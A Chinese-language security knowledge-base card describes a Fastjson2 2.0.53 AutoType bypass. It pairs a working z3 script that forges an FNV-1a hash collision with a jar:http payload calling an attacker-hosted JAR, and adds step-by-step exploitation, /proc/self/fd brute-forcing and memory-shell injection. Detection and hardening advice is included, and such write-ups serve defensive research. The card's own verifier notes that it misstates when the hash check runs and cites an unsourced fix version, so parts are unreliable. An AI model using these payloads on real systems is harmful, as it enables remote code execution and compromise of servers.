---
id: web-java-deser-fastjson2-fnv-z3-preimage-collision-rce
title: Fastjson2 默认 accept 哈希的 FNV-1a z3 预映像碰撞：任意前缀 jar:http 绕过 AutoType RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson2-fnv-z3-preimage-collision
tags:
- java
- fastjson2
- deserialization
- autotype
- fnv
- hash-collision
- z3
- jar-url
- rce
- proc-fd
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:52:39+08:00'
  notes: '已对照原文与29张截图核对：2.0.53、JSON.parseObject(input,Object.class)→ObjectReaderImplObject.readObject→getObjectReaderAutoType→checkAutoType、SAFE_MODE 直接返回 null、!autoTypeSupport 分支的 hash ^= ch / hash *= MAGIC_PRIME、Arrays.binarySearch(acceptHashCodes,hash)>=0 后 loadClass(typeName)、TypeUtils.loadClass 的 length>=192 拦截、默认 acceptHashCodes 唯一元素 -6293031534589903644、z3 前缀+5字符求解、jar:http 远程下载 GET /Hello、/proc/<pid>/fd 驻留、jar:file:.proc.self.fd.N 爆破命中后 /tmp/x 生成均与截图一致；已本地用 Python 复核 FNV(prefix)=0x9cc13838cf289652、FNV(prefix+\ue94c\uc17c\uf770\ua803\uc0d3)=0xa8aaa929446ffce4，且该值与 Fnv.hashCode64("com.alibaba.fastjson.util.AntiCollisionHashMap") 一致，PoC 碰撞数学成立。需修正的原理错误：卡片称“每读一个字符就用 Arrays.binarySearch(acceptHashCodes, hash) 比对一次”，但 img/13 源码显示 binarySearch 在 for 循环结束之后只执行一次（循环内只更新 hash）；应改为“整串哈希计算完成后与 acceptHashCodes 比对一次”。另：修复版本“2.0.63+”与 PR #7703 原文未给出（仅截图出现 PR #7695），属外部推断，建议标注来源或改为按 PR/官方公告确认。未在本机复现。'
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson2-fnv-z3-preimage-collision-rce/
draft: false
kb_aliases:
- Fastjson2 Hash 碰撞 RCE
- FNV-1a z3 碰撞
- 任意前缀哈希碰撞
- fastjson2 默认白名单哈希碰撞
- jar:http 点号绕过
- autoType 关闭绕过
- fastjson2 loadClass 绕过
- /proc/self/fd 驻留
---

## 一句话结论

Fastjson2 2.0.53 在 `autoTypeSupport=false` 时，`checkAutoType` 仍会逐字符计算 FNV-1a 64 位哈希并与 `acceptHashCodes` 比较，哈希命中后只把整串 `typeName` 交给 `loadClass`，不校验文本；而该哈希表在默认配置下并非空数组（至少含硬编码的 `ANTI_COLLISION_HASH_MAP_HASH`）。攻击者保留 `jar:http:..<十进制IP>:<端口>.<jar名>!.<类名>` 前缀，用 z3 求 5 个 Unicode 字符后缀把总哈希撞到该默认值，即可在未注册任何 accept 名称、未开启 autoType 的默认环境里让类加载器下载远程 JAR 并执行代码。

## 原理

- 入口：`JSON.parseObject(input, Object.class)` 走到 `ObjectReaderImplObject.readObject`，遇到 `@type` 字段时调用 `context.getObjectReaderAutoType(typeName, null)` → `ObjectReaderProvider.checkAutoType`。`List.class`、`Set.class`、`Collection.class`、`ArrayList.class`、`HashSet.class`、`Comparable.class`、`Serializable.class`、`Cloneable.class`、`Closeable.class`、`Object[].class` 以及 `JSON.parse(input)` 也能到达同一路径。
- 分支：即使 `autoTypeSupport=false`，`checkAutoType` 也会进入“增量哈希”分支：`hash ^= ch; hash *= MAGIC_PRIME;`，每读一个字符就用 `Arrays.binarySearch(acceptHashCodes, hash)` 比对一次；命中即执行 `clazz = loadClass(typeName)`。命中判断只基于哈希，命中后没有“实际文本等于白名单类名”的二次校验，因此任意长度的 `typeName` 只要能造出同一哈希，就会整体进入 `loadClass`。
- 默认表非空：`acceptHashCodes` 在未调用 `addAutoTypeAccept` 时仍包含硬编码的 `ANTI_COLLISION_HASH_MAP_HASH`，其值为 `-6293031534589903644`（`0xa8aaa929446ffce4`），等于 `Fnv.hashCode64("com.alibaba.fastjson.util.AntiCollisionHashMap")`。这一点是默认配置可打的关键：白名单永不为空，攻击者有一个固定、公开的目标哈希。
- 哈希可碰撞：FNV-1a 64 位的 offset 为 `0xcbf29ce484222325`、prime 为 `0x100000001b3`，运算只有异或与乘法，属于非密码学哈希。给定前缀后用 z3 建立 64 位 BitVec 方程，秒级即可求出使最终值等于目标的后缀；每个后缀字符取 >255（如 UTF-16 码点 0x100 以上）还能强制 fastjson2 走 FNV-1a 分支而非常量/短字符串优化。
- 前缀可保留：先对已知前缀（jar URL）单独跑一遍 FNV-1a 得到起始状态，再对未知后缀求解，即可做到 `FNV(prefix + suffix) == target`。后缀只改变哈希、不改变 URL 语义，因此攻击者能自由选择远程 JAR 地址。
- 远程加载：`TypeUtils.loadClass(typeName)` 先做 `className.length() >= 192` 的长度拦截，然后尝试 `Thread.currentThread().getContextClassLoader().loadClass(className)`。Spring Boot 的 `LaunchedURLClassLoader`/普通 `URLClassLoader` 能解析 `jar:http` URL；URL 中用点号代替斜杠（`jar:http:..IP.PORT.Hello!.Hello`），类加载器会还原成 `http://IP:PORT/Hello` 下载 JAR，再加载 `!/` 后的类。
- 执行：类被定义并初始化时执行 `static {}`；也可在构造方法中执行命令。要使加载成功，JAR 条目名与 class 字节码内部类名必须都等于 `@type` 中 `!/` 后的名字（含 Unicode 后缀），因此需复制原 class 条目并用 ASM 重命名内部类名，或直接按该名字编译。
- 二次驻留：JVM 下载 JAR 后以打开的文件描述符缓存临时 JAR（如 `/tmp/jar_cache*.tmp`，即使 unlink 后仍以 deleted 状态存在于 `/proc/<pid>/fd/<n>`）。由于 `jar:file` 的类名同样要先过哈希校验，需针对每个候选 fd 重新求后缀，构造 `jar:file:.proc.self.fd.<n>!.fd<n>.Exception<unicode>` 形式的 payload 逐个爆破；命中正确 fd 时从缓存 JAR 加载恶意类，可用于内存马注入等二次利用。

## 触发条件

- 目标使用存在该哈希校验逻辑的 fastjson2（文章以 2.0.53 测试），且 `SafeMode` 未开启（默认关闭）。
- 存在把不可信 JSON 交给 fastjson2 解析 `@type` 的入口，且期望类型是 `Object` 或上述集合/接口类型，或直接 `JSON.parse`。
- 目标进程的上下文 ClassLoader 能解析 `jar:http`（Spring Boot FatJar、URLClassLoader 环境），且能出网访问攻击者 HTTP 服务；JDK 8 对远程 JAR 加载最直接，JDK 11+ 可能限制远程 codebase，需要结合 fd/本地 gadget。
- 攻击者能控制 JAR 条目名与类内部名（含 Unicode 后缀）。
- fd 阶段额外要求 Linux 且有 `/proc/self/fd`，且类初始化只会发生一次（重放需重启或换类名）。

## 利用步骤

1. 确认 fastjson2 版本、`SafeMode` 状态、解析入口与 ClassLoader 形态。
2. 选定目标哈希：默认环境直接用硬编码的 `-6293031534589903644`；若应用注册过其他 accept 名称，也可用其哈希。
3. 选定前缀 `jar:http:..<十进制IP>:<端口>.<jar名>!.<类名>`（点号会被还原为斜杠；主机写成十进制整数，避免点号被误处理），用 z3 求 5 个 Unicode 后缀，使 `FNV(prefix+suffix)` 命中目标哈希。
4. 生成恶意 JAR：在 `Hello` 类静态块/构造中执行命令；把 class 内部类名与 JAR 条目名都改为 `Hello<suffix>`（ASM 或重编译），并保留一个正常的 `Hello.class` 供阶段一 URL 路径命中。
5. 把 JAR 以无后缀文件名放到攻击者 HTTP 根目录（例如 `Hello`），启动 HTTP 服务。
6. 发送 `{"@type":"<prefix><suffix>", ...}`；观察攻击者 HTTP 是否收到 `GET /Hello`、目标是否加载类并执行命令（可回连或用文件落地验证）。
7. 如需驻留/二次利用：阶段一让 JVM 打开 JAR，阶段二针对 fd 3..256 逐个生成 `jar:file:.proc.self.fd.<n>!.fd<n>.Exception<unicode>` 碰撞 payload（每个前缀单独求解后缀）批量发送；命中 fd 时缓存 JAR 内对应类被加载并执行 `<clinit>`。

## PoC

```python
# 最小 z3 求解：保留 jar URL 前缀，求 5 个 Unicode 后缀撞到默认 accept 哈希
from z3 import *
OFFSET, PRIME = 0xcbf29ce484222325, 0x100000001b3
TARGET = 0xa8aaa929446ffce4          # Fnv.hashCode64("com.alibaba.fastjson.util.AntiCollisionHashMap") 的无符号值
prefix = "jar:http:..2887610369:2333.Hello!.Hello"

h = OFFSET
for cu in prefix:                      # 前缀为 BMP 字符，与 Java char 一致
    h = ((h ^ ord(cu)) * PRIME) & 0xFFFFFFFFFFFFFFFF

c = [BitVec(f'c{i}', 64) for i in range(5)]
expr = BitVecVal(h, 64)
for i in range(5):
    expr = (expr ^ c[i]) * BitVecVal(PRIME, 64)

s = Solver()
s.add(expr == BitVecVal(TARGET, 64))
for i in range(5):
    s.add(c[i] >= 256, c[i] <= 65535)
    s.add(Or(c[i] < 0xD800, c[i] > 0xDFFF))   # 排除 UTF-16 代理对
assert s.check() == sat
m = s.model()
print(''.join(f'\\u{m[c[i]].as_long():04x}' for i in range(5)))
# 文章示例输出（5 字符）：셼ꠃ샓
```

```json
{"@type":"jar:http:..2887610369:2333.Hello!.Hello셼ꠃ샓","val":"example.com"}
```

```text
验证（FNV-1a 64）：
  FNV("jar:http:..2887610369:2333.Hello!.Hello")                          = 0x9cc13838cf289652
  FNV("...Hello" + "셼ꠃ샓")                      = 0xa8aaa929446ffce4
  0xa8aaa929446ffce4 作为有符号 long 即 -6293031534589903644
  → 命中 acceptHashCodes 唯一元素，进入 loadClass
```

```json
// 阶段二：fd 爆破（每个 n 的后缀需各自求解，此处省略具体码点）
{"@type":"jar:file:.proc.self.fd.147!.fd147.Exception<unicode-for-this-prefix>"}
```

```text
文章实验记录：
- 阶段一 HTTP 服务收到 GET /Hello；
- 目标返回异常（ClassFormatError/Truncated/Illegal class name）说明已进入 loadClass；
- 正确 JAR 与类名就位后 /tmp/x 被创建（RCE 前后对比）；
- 阶段二 Intruder 对 fd 3..256 爆破，命中后注入内存马。
说明：上述 PoC 未在本机执行，命令执行结果来自文章截图。
```

## 变体与关联

- 变体（更省事但前提不同）：`$ → .` 归一化碰撞——`checkAutoType` 计算哈希前把 `$` 归一化为 `.`，因此 `com.example$` 与已注册的 `com.example.` 同哈希，零成本碰撞，但要求应用注册过以 `.` 结尾的 accept 名称；本卡不依赖任何应用配置。
- 变体：`ObjectReaderSeeAlso` 在开启 SupportAutoType 后的无校验回退 `loadClass`，不需要哈希碰撞。
- 变体：`JSON.parseObject(input, List/Set/Collection/ArrayList/HashSet/Comparable/Serializable/Cloneable/Closeable/Object[].class)` 与 `JSON.parse(input)` 均可到达同一路径；数组输入经 `JSONReader.read` 调用 `ObjectReaderImplObject.readObject`。
- 变体（fd 获取方式）：`jar:http` 拉取后的 `/tmp/jar_cache*.tmp` fd、Tomcat multipart 临时文件 fd、预落盘 `file:`/`jar:file:` 本地 JAR，分别对应不同部署条件。
- 关联：[[web-java-deser-fastjson2-fnv-collision-autotype-bypass]]（同函数、`$→.` 归一化版）、[[web-java-deser-fastjson2-seealso-fallback-loadclass-rce]]（SeeAlso 回退）、[[web-java-deser-fastjson-jar-cache-fd-reload-rce]]（1.2.83 的 jar:http + fd 枚举，思路同源但代际不同）。
- 边界：`SafeMode` 开启时 `checkAutoType` 直接返回 null；`TypeUtils.loadClass` 对 `className.length() >= 192` 直接返回 null；2.0.63+ 的 AutoType 类型名校验（PR #7695/#7703）会拒绝含 `:`/`!` 的类型名与异常后缀；目标不可出网或 JDK 限制远程加载时链路不成立。

## 检测与防御

- 请求检测：`@type` 出现 `jar:`、`http:`、`file:`、`!`、`/proc/self/fd`、十进制 IP（如 2887610369）、非 ASCII Unicode 转义、连续 5 个高位码点后缀；同一数组内先 `jar:http` 后大批 `jar:file:.proc.self.fd.N` 的组合。
- 主机检测：JVM 出现远程 JAR 下载与 `URLClassLoader`/`defineClass` 加载非本地路径；`/proc/<pid>/fd` 存在 deleted 的 `jar_cache*.tmp`；日志出现 `ClassFormatError`、`Illegal class name`、`type not match` 等异常类名后紧跟外连。
- 网络检测：应用进程对陌生地址发起 GET 拉取无后缀 JAR；随后出现大量短连接 JSON 请求（fd 爆破特征）。
- 修复：升级 fastjson2（2.0.63+）；启用 SafeMode（`JSONFactory.setSafeMode(true)` 或 `-Dfastjson2.parser.safeMode=true`）；不要反序列化不可信多态 JSON。
- 加固：如必须使用 autoType，采用严格白名单并校验完整类型文本而非哈希；限制应用出网与远程类加载；RASP 监控 `checkAutoType`、`loadClass`、`/proc/self/fd` 访问；容器最小权限运行并限制临时目录。
- 审计：定位所有 `parseObject(..., Object/List/Set/... )` 与 `JSON.parse` 调用点；确认 `acceptHashCodes` 是否含可被预映像碰撞的固定哈希（默认硬编码值即已足够）。
